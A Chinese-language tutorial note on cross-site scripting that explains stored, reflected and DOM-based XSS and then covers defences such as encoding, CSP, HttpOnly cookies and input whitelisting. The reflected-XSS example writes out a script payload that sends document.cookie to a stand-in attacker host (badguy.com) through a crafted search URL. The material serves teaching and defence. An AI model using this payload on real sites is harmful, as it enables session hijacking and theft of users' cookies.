# XSS 跨域脚本攻击(Cross-Site Scripting)

跨站脚本攻击称为`XSS`，为了和`CSS`有所区分所以简写为`XSS`。
`XSS`注入攻击的一种，**本质是在网站上注入恶意脚本，使之在浏览器上运行**。
`XSS`攻击的主要攻击方式有获取用户信息(例如 Cookie)、在页面插入内容(例如广告)或流量劫持、诱导用户到非法网站等。

任何可输入的地方都可能注入恶意脚本，常见的输入方式：

- 用户的 UGC 信息
- URL 参数
- POST 参数
- Referer
- Cookie

常见的注入方式：

- 在 HTML 中内嵌的文本中，恶意内容以`<script/>`标签形成注入。
- 在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。
- 在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。
- 标签的`href`、`src`属性，事件`onload`、`onerror`、`onclick`等使用`javascript:`注入

## 存储型(持久型) XSS 攻击

1. 攻击者将恶意代码提交到目标网站的数据库中。
2. 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。
3. 浏览器解析执行，混在其中的恶意代码也被执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

常见场景：UGC 类网站，如贴吧、评论等
危险性较大，无需用户手动触发隐蔽性高，存储型攻击会对访问被攻击页面的所有用户进行攻击。

## 反射型(非持久型) XSS 攻击

1. 攻击者构造出特殊的 URL，其中包含恶意代码。
2. 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

常见常见：通过 URL 传递参数的功能，如网站搜索、跳转等。
危险性相对存储型较小，只有用户主动打开恶意的 URL 才能生效

```HTML
<!-- http://victim.com网站 后台代码 -->
<html>
　　<title></title>
　　<body>
　　　　Results  for  <%Request.QueryString("term")%>
　　　　...
　　</body>
</html>
<!-- 攻击 -->
<!-- step1 建立后台用来偷取用户信息 -->
http://badguy.com
<!-- step2 发送恶意链接，可以通过邮件 qq等 -->
http://victim.com/search.asp?term=<script>window.open("http://badguy.com?cookie="+document.cookie)</script>
<!-- 这时只要用户点击这个连接，那么生成的页面中就包含可以指向的代码片段 -->
<script>window.open("http://badguy.com?cookie="+document.cookie)</script>
<!-- 这个代码自动运行把用户的cookie发送到了攻击者的网站 -->
```

## DOM 型 XSS 攻击

1. 攻击者构造出特殊的 URL，其中包含恶意代码。
2. 用户打开带有恶意代码的 URL。
3. 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

## 应对策略

一些高级浏览器会自动拦截 XSS 攻击但是不能完全拦截。
防治的根本之道是过滤用户的输入，做`encode`处理，将其中的`<`、`>`、`'`、`"`、`;`之类的特殊字符进行编码。
在这方面前端无法彻底解决，更多的需要后端进行处理。

### CSP(Content-Security-Policy)

内容安全策略(CSP)的目标是建设和报告 XSS 攻击。CSP 通过指定有效域(浏览器认可的可执行脚本来源)可以阻止非信任脚本执行。

CSP 有两种配置方式：

- 在服务端使用 HTTP Response Header `Content-Security-Policy`字段配置
- 在 HTML 页面中使用`<meta>`标签配置

策略示例：`Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com`

- 各种内容默认仅允许从文档所在的源获取`default-src 'self';`, 但存在如下例外:
- 图片可以从任何地方加载(注意`*`通配符)。
- 多媒体文件仅允许从`media1.com`和`media2.com`加载(不允许从这些站点的子域名)。
- 可运行脚本仅允许来自于`userscripts.example.com`。

详细配置策略参考：[内容安全策略( CSP )](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)

### HttpOnly 防止劫持 Cookie

将重要的 Cookie 标记为`http-only`, 浏览器将禁止 Javascript 访问被标记的 Cookie，能阻止 XSS 攻击后的 Cookie 劫持攻击.

### 输入检查

**不相信用户的任何输入**，对于用户的任何输入要进行检查、过滤和转义。

1. 建立可信任的字符和 HTML 标签白名单，对于不在白名单之列的字符或者标签进行过滤或编码。
2. 只允许用户输入我们期望的数据。 例如：年龄的`<input />`中，只允许用户输入数字，数字之外的字符都过滤掉。
3. 检测是否包含`< >`等特殊字符，对特殊在发进行过滤或编码。

## TODO:WEB&Node 字符转义

## TODO:XSS 检测
